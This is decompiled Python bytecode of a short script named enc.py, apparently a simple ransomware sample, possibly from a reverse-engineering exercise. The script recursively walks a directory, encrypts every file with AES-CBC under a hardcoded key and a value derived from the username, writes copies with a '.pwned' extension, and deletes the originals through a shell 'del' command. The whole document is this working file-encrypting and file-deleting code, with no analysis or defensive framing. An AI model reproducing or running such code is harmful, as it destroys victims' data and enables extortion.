# decompyle3 version 3.3.2
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.7.6 (default, Jan 19 2020, 22:34:52) 
# [GCC 9.2.1 20200117]
# Embedded file name: enc.py
# Size of source mod 2**32: 227 bytes
import os, getpass
from Crypto.Cipher import AES
from hashlib import sha256
import glob

def encrypt(f):
    o = f + '.pwned'
    chunky = 65536
    key = b'M3+q)Xdm\\tezpUA{'    #b in front of strings stands for bytes)becouse python3 cant convert str to byte
    hkey = sha256(key).digest()[5:21]
    u = getpass.getuser()
    k = u + o + f
    IV = sha256(k.encode('utf-8')).digest()[7:23]
    print(k, IV)
    enc = AES.new(IV, AES.MODE_CBC, hkey)
    with open(f, 'rb') as inf:
        with open(o, 'wb') as outf:
            while True:
                chunk = inf.read(chunky)
                if len(chunk) == 0:
                    break
                else:
                    if len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)
                    outf.write(enc.encrypt(chunk))

    os.system('del "{}"'.format(f))


def main():
    root = '/home/shell/Desktop/Random'
    for f in glob.iglob((root + '**/**'), recursive=True):
        if os.path.isfile(f):
            encrypt(f)


main()
# okay decompiling enc.pyc
